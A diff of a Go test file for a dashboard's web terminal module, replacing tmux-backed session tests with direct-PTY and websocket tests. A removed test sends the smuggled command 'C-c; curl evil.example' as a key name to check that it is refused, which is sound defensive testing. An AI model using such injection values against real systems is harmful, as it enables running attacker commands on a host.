@@ -13,9 +13,7 @@ import (
 	"net/http/httptest"
 	"net/textproto"
 	"os"
-	"os/exec"
 	"path/filepath"
-	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -27,20 +25,11 @@ import (
 	"github.com/Wayy01/Just-Dashboard/backend/internal/store"
 	"github.com/Wayy01/Just-Dashboard/backend/internal/term"
 	"github.com/go-chi/chi/v5"
+	"github.com/gorilla/websocket"
 )
-
-// These drive the real handlers against a real tmux, because the bug they
-// exist to catch was not in any one function: creating a session answered
-// correctly, tmux stored the folder correctly, and the listing read from tmux
-// correctly — and the sequence of the three put a new session in the wrong
-// group for the first half-second of its life, which is exactly the window the
-// page refreshes in. Only the round trip shows it.
 
 func terminalServer(t *testing.T) (*Server, http.Handler) {
 	t.Helper()
-	if _, err := exec.LookPath("tmux"); err != nil {
-		t.Skip("tmux is not installed on this machine")
-	}
 	st, err := store.Open(t.TempDir())
 	if err != nil {
 		t.Fatal(err)
@@ -63,23 +52,15 @@ func terminalServer(t *testing.T) (*Server, http.Handler) {
 		TerminalEnable: true,
 	}
 	log := slog.New(slog.NewTextHandler(io.Discard, nil))
-	svc := auth.NewService(st, sealer, cfg.SessionTTL, cfg.IdleTTL)
+	svc := auth.NewService(st, sealer, cfg.SessionTTL, cfg.IdleTTL, cfg.Require2FA)
 	s := New(cfg, log, st, svc, sealer, audit.New(st, log), nil)
-	if !s.modules.term.TmuxAvailable() {
-		t.Skip("the terminal module did not find tmux")
-	}
+	s.modules.term.SetClipboardRootForTest(t.TempDir())
 	if _, err := s.modules.term.Account(); err != nil {
 		t.Skipf("no account to open a session as: %v", err)
 	}
 
-	// Every tmux session this test opens has to be closed, or it outlives the
-	// test run on the developer's machine — which is the whole property the
-	// feature is built on, and a nuisance in a test.
-	// context.Background, not t.Context: the test's context is already
-	// cancelled by the time cleanups run, so the `tmux kill-session` would
-	// never be executed and every session this test opened would outlive the
-	// run — which the next test then sees, because the tmux server is the
-	// machine's and not this process's.
+	// context.Background, not t.Context: the test context is already cancelled
+	// by the time cleanups run, but the direct PTYs still need to be reaped.
 	t.Cleanup(func() {
 		for _, sess := range s.modules.term.List() {
 			s.modules.term.Kill(context.Background(), sess.ID)
@@ -104,38 +85,6 @@ func terminalServer(t *testing.T) (*Server, http.Handler) {
 	})
 	s.mountTerminalRoutes(r)
 	return s, r
-}
-
-// TestMain gives this package's tests a tmux server of their own.
-//
-// Two reasons, and both are the difference between a test suite that passes
-// and one that means anything. The obvious one is the developer's machine: the
-// terminal's whole promise is that a session outlives the process that made
-// it, so a test that opened one against the real tmux server would leave it
-// there, and a test that listed sessions would find the operator's. The other
-// is that `go test ./...` runs packages concurrently — the sessions this
-// package creates and the ones another package creates would land on the same
-// server and appear in each other's listings, which is exactly the sort of
-// cross-talk the feature must never have and a test must never invent.
-//
-// tmux takes its socket directory from TMUX_TMPDIR, and every `tmux` this
-// package runs is a child of this process, so setting it here is enough.
-func TestMain(m *testing.M) {
-	dir, err := os.MkdirTemp("", "jdtmux")
-	if err == nil {
-		// Short, because a unix socket path has about a hundred characters to
-		// play with and a nested temp directory can spend them all.
-		os.Setenv("TMUX_TMPDIR", dir)
-		defer os.RemoveAll(dir)
-	}
-	code := m.Run()
-	// The server outlives the tests otherwise: that is the property under
-	// test, and a stray tmux server per run is not a legacy worth keeping.
-	exec.Command("tmux", "kill-server").Run()
-	if err == nil {
-		os.RemoveAll(dir)
-	}
-	os.Exit(code)
 }
 
 type apiCall struct {
@@ -204,13 +153,109 @@ func (l listResponse) session(t *testing.T, title string) workspace {
 func (c apiCall) create(title, folder string) workspace {
 	c.t.Helper()
 	rec := c.ok(http.MethodPost, "/terminal/", map[string]any{
-		"title": title, "folder": folder, "persist": true, "rows": 24, "cols": 80,
+		"title": title, "folder": folder, "rows": 24, "cols": 80,
 	}, "")
 	var created workspace
 	if err := json.Unmarshal(rec.Body.Bytes(), &created); err != nil {
 		c.t.Fatal(err)
 	}
 	return created
+}
+
+func TestTerminalSizeQuery(t *testing.T) {
+	for _, tt := range []struct {
+		query      string
+		rows, cols uint16
+		ok         bool
+	}{
+		{query: "?rows=43&cols=156", rows: 43, cols: 156, ok: true},
+		{query: "?rows=0&cols=156"},
+		{query: "?rows=43"},
+		{query: "?rows=-1&cols=80"},
+		{query: "?rows=43&cols=999999"},
+	} {
+		r := httptest.NewRequest(http.MethodGet, "/terminal/id/attach"+tt.query, nil)
+		rows, cols, ok := terminalSizeQuery(r)
+		if rows != tt.rows || cols != tt.cols || ok != tt.ok {
+			t.Errorf("terminalSizeQuery(%q) = %d, %d, %v; want %d, %d, %v", tt.query, rows, cols, ok, tt.rows, tt.cols, tt.ok)
+		}
+	}
+}
+
+func TestTerminalAttachSynchronizesPTYBeforeRawIO(t *testing.T) {
+	_, handler := terminalServer(t)
+	api := apiCall{t, handler}
+	created := api.create("geometry", "")
+
+	httpServer := httptest.NewServer(handler)
+	defer httpServer.Close()
+	wsURL := "ws" + strings.TrimPrefix(httpServer.URL, "http") +
+		"/terminal/" + created.ID + "/attach?rows=43&cols=156"
+	conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer conn.Close()
+	if err := conn.WriteMessage(websocket.BinaryMessage, []byte("stty size\r")); err != nil {
+		t.Fatal(err)
+	}
+	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
+		t.Fatal(err)
+	}
+	var output []byte
+	for !bytes.Contains(output, []byte("43 156")) {
+		kind, chunk, err := conn.ReadMessage()
+		if err != nil {
+			t.Fatalf("reading PTY output: %v; output %q", err, output)
+		}
+		if kind != websocket.BinaryMessage {
+			continue
+		}
+		output = append(output, chunk...)
+	}
+}
+
+func TestDirectPTYAttachRetainsBestEffortShellHistory(t *testing.T) {
+	s, handler := terminalServer(t)
+	api := apiCall{t, handler}
+	created := api.create("direct-history", "")
+	sess, err := s.modules.term.Get(created.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	deadline := time.Now().Add(5 * time.Second)
+	for {
+		snapshot, id, _, err := sess.Subscribe()
+		if err != nil {
+			t.Fatal(err)
+		}
+		sess.Unsubscribe(id)
+		if len(snapshot) > 0 {
+			break
+		}
+		if time.Now().After(deadline) {
+			t.Fatal("direct PTY produced no startup output")
+		}
+		time.Sleep(20 * time.Millisecond)
+	}
+
+	httpServer := httptest.NewServer(handler)
+	defer httpServer.Close()
+	wsURL := "ws" + strings.TrimPrefix(httpServer.URL, "http") +
+		"/terminal/" + created.ID + "/attach?rows=31&cols=106"
+	conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer conn.Close()
+	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+	kind, payload, err := conn.ReadMessage()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if kind != websocket.TextMessage || !bytes.Contains(payload, []byte(`"type":"scrollback"`)) {
+		t.Fatalf("first direct PTY frame = kind %d %q, want scrollback marker", kind, payload)
+	}
 }
 
 // The reported bug, end to end.
@@ -223,32 +268,22 @@ func (c apiCall) create(title, folder string) workspace {
 // read the listing the page reads immediately afterwards, then create a second
 // session and read it again. The first listing used to put the new session
 // under no folder, and the second used to show the two sessions swapping
-// places, because tmux had caught up in between.
+// places. Workspace metadata must be visible on the first listing and remain
+// stable when another direct PTY workspace is opened.
 func TestSessionCreatedInAFolderIsInThatFolderImmediately(t *testing.T) {
 	_, handler := terminalServer(t)
 	api := apiCall{t, handler}
 
-	api.ok(http.MethodPost, "/terminal/folders", map[string]any{
-		"name": "deploy", "colour": "blue",
-	}, "")
+	api.ok(http.MethodPost, "/terminal/folders", map[string]any{"name": "deploy"}, "")
 
 	inFolder := api.create("migration", "deploy")
 	if inFolder.Folder != "deploy" {
 		t.Fatalf("the create response says folder=%q, want deploy", inFolder.Folder)
 	}
-	// The folder's colour is inherited, so a group looks like a group without
-	// the operator painting every session in it.
-	if inFolder.Colour != "blue" {
-		t.Errorf("the new session's colour = %q, want blue inherited from the folder", inFolder.Colour)
-	}
-
 	first := api.list()
 	got := first.session(t, "migration")
 	if got.Folder != "deploy" {
 		t.Fatalf("the listing taken straight after the create puts the session in %q, want deploy", got.Folder)
-	}
-	if got.Colour != "blue" {
-		t.Errorf("colour = %q in the first listing, want blue", got.Colour)
 	}
 
 	// The second half of the report: opening an unrelated session must not
@@ -275,20 +310,19 @@ func TestPartialMetaUpdateKeepsTheRest(t *testing.T) {
 	api := apiCall{t, handler}
 	created := api.create("api server", "")
 
-	path := "/terminal/persistent/" + created.TmuxName
+	path := "/terminal/" + created.ID
 	api.ok(http.MethodPatch, path, map[string]any{"folder": "infra"}, "")
 	after := api.list().session(t, "api server")
 	if after.Folder != "infra" {
 		t.Fatalf("folder = %q after the drag, want infra", after.Folder)
 	}
 
-	api.ok(http.MethodPatch, path, map[string]any{"colour": "red"}, "")
 	api.ok(http.MethodPatch, path, map[string]any{"favourite": true}, "")
 	final := api.list().session(t, "api server")
 	if final.Title != "api server" || final.Folder != "infra" {
-		t.Errorf("a colour change disturbed the rest: %+v", final)
+		t.Errorf("a partial metadata change disturbed the rest: %+v", final)
 	}
-	if final.Colour != "red" || !final.Favourite {
+	if !final.Favourite {
 		t.Errorf("the changes did not stick: %+v", final)
 	}
 }
@@ -304,7 +338,7 @@ func TestRenamingAFolderMovesItsSessions(t *testing.T) {
 	api.create("worker", "staging")
 
 	api.ok(http.MethodPatch, "/terminal/folders/staging",
-		map[string]any{"name": "production", "colour": "amber"}, "")
+		map[string]any{"name": "production"}, "")
 
 	after := api.list()
 	names := []string{}
@@ -318,9 +352,6 @@ func TestRenamingAFolderMovesItsSessions(t *testing.T) {
 		s := after.session(t, title)
 		if s.Folder != "production" {
 			t.Errorf("%s stayed in %q", title, s.Folder)
-		}
-		if s.Colour != "amber" {
-			t.Errorf("%s was not repainted with its folder: colour=%q", title, s.Colour)
 		}
 	}
 }
@@ -349,7 +380,7 @@ func TestDeletingAFolderUnfilesItsSessions(t *testing.T) {
 }
 
 // Two folders cannot share a name, however it is capitalised: the name is the
-// key both the record and every session's tmux option are matched on.
+// key used by both the record and every workspace's metadata.
 func TestFolderNamesAreUnique(t *testing.T) {
 	_, handler := terminalServer(t)
 	api := apiCall{t, handler}
@@ -369,7 +400,7 @@ func TestFolderOrderIsKept(t *testing.T) {
 		api.ok(http.MethodPost, "/terminal/folders", map[string]any{"name": name}, "")
 	}
 	api.ok(http.MethodPut, "/terminal/folders", map[string]any{
-		"folders": []map[string]any{{"name": "c"}, {"name": "a", "colour": "green"}, {"name": "b"}},
+		"folders": []map[string]any{{"name": "c"}, {"name": "a"}, {"name": "b"}},
 	}, "")
 
 	after := api.list()
@@ -380,132 +411,48 @@ func TestFolderOrderIsKept(t *testing.T) {
 	if strings.Join(got, ",") != "c,a,b" {
 		t.Fatalf("order = %v, want [c a b]", got)
 	}
-	if after.Folders[1].Colour != "green" {
-		t.Errorf("the colour did not survive the reorder: %+v", after.Folders[1])
-	}
 }
 
-// The windows of a session, through the routes the strip actually calls:
-// create, rename, colour, reorder by drag, and close behind its phrase.
-func TestWindowsCanBeNamedColouredReorderedAndClosed(t *testing.T) {
-	s, handler := terminalServer(t)
+// Direct sessions contain independent PTY windows: no tmux persistence and no
+// pane routes. The strip can create, rename, reorder and close them.
+func TestDirectPTYWindowsCanBeNamedReorderedAndClosed(t *testing.T) {
+	_, handler := terminalServer(t)
 	api := apiCall{t, handler}
 	created := api.create("build", "")
-	base := "/terminal/persistent/" + created.TmuxName
+	base := "/terminal/" + created.ID
+	api.ok(http.MethodPatch, base, map[string]any{"favourite": true}, "")
 
-	waitForWindows(t, s, created.TmuxName, 1)
 	api.ok(http.MethodPost, base+"/windows", map[string]any{"name": "logs"}, "")
-	api.ok(http.MethodPost, base+"/windows", map[string]any{"name": "shell"}, "")
-	waitForWindows(t, s, created.TmuxName, 3)
-
+	api.ok(http.MethodPost, base+"/windows", map[string]any{"name": "commands"}, "")
 	windows := fetchWindows(t, api, base)
-	api.ok(http.MethodPatch, base+"/windows/"+itoa(windows[0].Index),
-		map[string]any{"name": "compile", "colour": "violet"}, "")
-
-	windows = fetchWindows(t, api, base)
-	if windows[0].Name != "compile" || windows[0].Colour != "violet" {
-		t.Fatalf("rename and colour did not stick: %+v", windows[0])
+	if len(windows) != 3 {
+		t.Fatalf("windows = %d, want 3", len(windows))
 	}
 
-	// The drag: the last window dropped at the front of the strip.
+	api.ok(http.MethodPatch, base+"/windows/"+windows[0].ID,
+		map[string]any{"name": "compile"}, "")
+	windows = fetchWindows(t, api, base)
+	if windows[0].Name != "compile" {
+		t.Fatalf("rename did not stick: %+v", windows[0])
+	}
+
 	last := windows[2]
-	api.ok(http.MethodPatch, base+"/windows/"+itoa(last.Index),
-		map[string]any{"position": 0}, "")
+	api.ok(http.MethodPatch, base+"/windows/"+last.ID, map[string]any{"position": 0}, "")
 	windows = fetchWindows(t, api, base)
-	if windows[0].Name != last.Name {
-		t.Errorf("after the drag the strip starts with %q, want %q", windows[0].Name, last.Name)
+	if windows[0].ID != last.ID {
+		t.Errorf("after reorder first = %q, want %q", windows[0].ID, last.ID)
 	}
 
-	// Closing takes no typed phrase, unlike the rest of the destructive
-	// surface. Closing a shell is an everyday act, and a phrase in front of one
-	// gets typed rather than read — which is the habit the typed confirmation
-	// exists to prevent everywhere it does still apply.
-	victim := windows[1]
-	api.ok(http.MethodDelete, base+"/windows/"+itoa(victim.Index), nil, "")
+	api.ok(http.MethodDelete, base+"/windows/"+windows[1].ID, nil, "")
 	if got := fetchWindows(t, api, base); len(got) != 2 {
 		t.Errorf("after closing one there are %d windows, want 2", len(got))
 	}
-}
-
-// Splitting and closing panes, through the routes the pane bar calls.
-func TestPanesSplitAndClose(t *testing.T) {
-	s, handler := terminalServer(t)
-	api := apiCall{t, handler}
-	created := api.create("panes", "")
-	base := "/terminal/persistent/" + created.TmuxName
-	waitForWindows(t, s, created.TmuxName, 1)
-
-	windows := fetchWindows(t, api, base)
-	window := itoa(windows[0].Index)
-
-	api.ok(http.MethodPost, base+"/windows/"+window+"/panes", map[string]any{"vertical": true}, "")
-	panes := fetchPanes(t, api, base+"/windows/"+window+"/panes")
-	if len(panes) != 2 {
-		t.Fatalf("after a split there are %d panes, want 2", len(panes))
+	if workspace := api.list().session(t, "build"); !workspace.Favourite {
+		t.Error("workspace metadata was lost when its original PTY window closed")
 	}
-	// A pane's label is what is running in it, which is the only useful one.
-	if panes[0].Command == "" {
-		t.Error("a pane with no command has nothing to identify it by")
+	if rec := api.do(http.MethodGet, base+"/windows/0/panes", nil, ""); rec.Code != http.StatusNotFound {
+		t.Fatalf("pane route = %d, want 404", rec.Code)
 	}
-
-	api.ok(http.MethodPatch, base+"/windows/"+window+"/panes/"+itoa(panes[1].Index),
-		map[string]any{"zoom": true}, "")
-	api.ok(http.MethodDelete, base+"/windows/"+window+"/panes/"+itoa(panes[1].Index), nil, "")
-	if got := fetchPanes(t, api, base+"/windows/"+window+"/panes"); len(got) != 1 {
-		t.Fatalf("after closing one there are %d panes, want 1", len(got))
-	}
-
-	// And the window's only pane is refused, because tmux would take the
-	// window with it.
-	rec := api.do(http.MethodDelete, base+"/windows/"+window+"/panes/0", nil, "")
-	if rec.Code != http.StatusBadRequest {
-		t.Fatalf("closing the last pane = %d, want 400: %s", rec.Code, rec.Body.String())
-	}
-}
-
-// A window dragged out of one session and dropped on another in the rail.
-func TestWindowMovesBetweenSessions(t *testing.T) {
-	s, handler := terminalServer(t)
-	api := apiCall{t, handler}
-	from := api.create("source", "")
-	to := api.create("dest", "")
-	waitForWindows(t, s, from.TmuxName, 1)
-	waitForWindows(t, s, to.TmuxName, 1)
-
-	fromBase := "/terminal/persistent/" + from.TmuxName
-	api.ok(http.MethodPost, fromBase+"/windows", map[string]any{"name": "moving"}, "")
-	waitForWindows(t, s, from.TmuxName, 2)
-
-	windows := fetchWindows(t, api, fromBase)
-	api.ok(http.MethodPatch, fromBase+"/windows/"+itoa(windows[1].Index),
-		map[string]any{"session": to.TmuxName}, "")
-
-	if got := fetchWindows(t, api, fromBase); len(got) != 1 {
-		t.Errorf("the source kept %d windows, want 1", len(got))
-	}
-	arrived := fetchWindows(t, api, "/terminal/persistent/"+to.TmuxName)
-	if len(arrived) != 2 || arrived[1].Name != "moving" {
-		t.Errorf("the destination has %+v, want the moved window appended", arrived)
-	}
-}
-
-// Sending keys is a way to run a command on the host, so the key names are a
-// closed list and anything outside it is refused rather than passed to tmux.
-func TestSendKeysRefusesAnUnknownKey(t *testing.T) {
-	s, handler := terminalServer(t)
-	api := apiCall{t, handler}
-	created := api.create("keys", "")
-	waitForWindows(t, s, created.TmuxName, 1)
-	base := "/terminal/persistent/" + created.TmuxName
-	window := itoa(fetchWindows(t, api, base)[0].Index)
-
-	rec := api.do(http.MethodPost, base+"/windows/"+window+"/keys",
-		map[string]any{"keys": []string{"C-c; curl evil.example"}}, "")
-	if rec.Code != http.StatusBadRequest {
-		t.Fatalf("an unknown key = %d, want 400: %s", rec.Code, rec.Body.String())
-	}
-	api.ok(http.MethodPost, base+"/windows/"+window+"/keys",
-		map[string]any{"keys": []string{"C-c"}}, "")
 }
 
 func clipboardUploadRequest(t *testing.T, path, filename, mimeType string, body []byte) *http.Request {
@@ -552,14 +499,14 @@ func TestTerminalClipboardUploadUsesSessionDirectoryAndIgnoresMultipartPath(t *t
 	if err := json.Unmarshal(rec.Body.Bytes(), &uploaded); err != nil {
 		t.Fatal(err)
 	}
-	wantDir := filepath.Join(term.ClipboardRoot, created.ID)
-	if filepath.Dir(uploaded.Path) != wantDir {
-		t.Fatalf("path = %q, want a randomized file in %q", uploaded.Path, wantDir)
+	wantDir := filepath.Dir(uploaded.Path)
+	if filepath.Base(wantDir) != created.ID {
+		t.Fatalf("path = %q, want a randomized file in a directory named %q", uploaded.Path, created.ID)
 	}
 	if uploaded.Name != "screenshot.png" || uploaded.MIME != "image/png" || uploaded.Size != int64(len(body)) {
 		t.Errorf("response = %+v", uploaded)
 	}
-	if _, err := os.Stat(filepath.Join(term.ClipboardRoot, "screenshot.png")); !os.IsNotExist(err) {
+	if _, err := os.Stat(filepath.Join(filepath.Dir(wantDir), "screenshot.png")); !os.IsNotExist(err) {
 		t.Errorf("multipart traversal wrote outside the session directory: %v", err)
 	}
 	if err := s.modules.term.Kill(context.Background(), created.ID); err != nil {
@@ -620,15 +567,9 @@ func TestTerminalClipboardUploadEnforcesDashboardSessionOwnership(t *testing.T) 
 }
 
 type testWindow struct {
-	Index  int    `json:"index"`
-	Name   string `json:"name"`
-	Colour string `json:"colour"`
-	Panes  int    `json:"panes"`
-}
-
-type testPane struct {
-	Index   int    `json:"index"`
-	Command string `json:"command"`
+	ID    string `json:"id"`
+	Index int    `json:"index"`
+	Name  string `json:"name"`
 }
 
 func fetchWindows(t *testing.T, api apiCall, base string) []testWindow {
@@ -641,29 +582,69 @@ func fetchWindows(t *testing.T, api apiCall, base string) []testWindow {
 	return out
 }
 
-func fetchPanes(t *testing.T, api apiCall, path string) []testPane {
-	t.Helper()
-	rec := api.ok(http.MethodGet, path, nil, "")
-	var out []testPane
-	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
+// Nothing is called "shell": an unnamed session and its windows are numbered
+// "Terminal", and the listing says which names the operator chose so the page
+// knows which ones may follow what the shell is doing.
+func TestUnnamedSessionsAndWindowsAreCalledTerminal(t *testing.T) {
+	_, handler := terminalServer(t)
+	api := apiCall{t, handler}
+	rec := api.ok(http.MethodPost, "/terminal/", map[string]any{"rows": 24, "cols": 80}, "")
+	var first struct {
+		ID    string `json:"id"`
+		Title string `json:"title"`
+	}
+	if err := json.Unmarshal(rec.Body.Bytes(), &first); err != nil {
 		t.Fatal(err)
 	}
-	return out
-}
-
-// tmux creates a session asynchronously — the PTY has been handed the command
-// and the server may still be starting — so anything addressing a session by
-// name has to wait for it to exist first.
-func waitForWindows(t *testing.T, s *Server, name string, want int) {
-	t.Helper()
-	for attempt := 0; attempt < 60; attempt++ {
-		windows, err := s.modules.term.Windows(context.Background(), name)
-		if err == nil && len(windows) >= want {
-			return
-		}
-		time.Sleep(50 * time.Millisecond)
+	if first.Title != "Terminal" {
+		t.Fatalf("first session is called %q, want Terminal", first.Title)
 	}
-	t.Fatalf("session %s never reported %d windows", name, want)
-}
+	rec = api.ok(http.MethodPost, "/terminal/", map[string]any{"rows": 24, "cols": 80}, "")
+	var second struct {
+		Title string `json:"title"`
+	}
+	if err := json.Unmarshal(rec.Body.Bytes(), &second); err != nil {
+		t.Fatal(err)
+	}
+	if second.Title != "Terminal 2" {
+		t.Fatalf("second session is called %q, want Terminal 2", second.Title)
+	}
 
-func itoa(v int) string { return strconv.Itoa(v) }
+	base := "/terminal/" + first.ID
+	api.ok(http.MethodPost, base+"/windows", nil, "")
+	api.ok(http.MethodPost, base+"/windows", map[string]any{"name": "logs"}, "")
+	rec = api.ok(http.MethodGet, base+"/windows", nil, "")
+	var windows []struct {
+		Name  string `json:"name"`
+		Named bool   `json:"named"`
+		Busy  bool   `json:"busy"`
+	}
+	if err := json.Unmarshal(rec.Body.Bytes(), &windows); err != nil {
+		t.Fatal(err)
+	}
+	if len(windows) != 3 {
+		t.Fatalf("windows = %+v, want 3", windows)
+	}
+	if windows[0].Name != "Terminal" || windows[0].Named {
+		t.Errorf("first window = %+v, want an unnamed Terminal", windows[0])
+	}
+	if windows[1].Name != "Terminal 2" || windows[1].Named {
+		t.Errorf("second window = %+v, want an unnamed Terminal 2", windows[1])
+	}
+	if windows[2].Name != "logs" || !windows[2].Named {
+		t.Errorf("third window = %+v, want a named logs", windows[2])
+	}
+
+	listing := api.list()
+	ws := listing.session(t, "Terminal")
+	if ws.Named {
+		t.Error("a default title counts as chosen")
+	}
+	if ws.Current == nil {
+		t.Fatal("the listing names no current window")
+	}
+	api.ok(http.MethodPatch, base, map[string]any{"title": "build box"}, "")
+	if ws := api.list().session(t, "build box"); !ws.Named {
+		t.Error("a typed title does not count as chosen")
+	}
+}
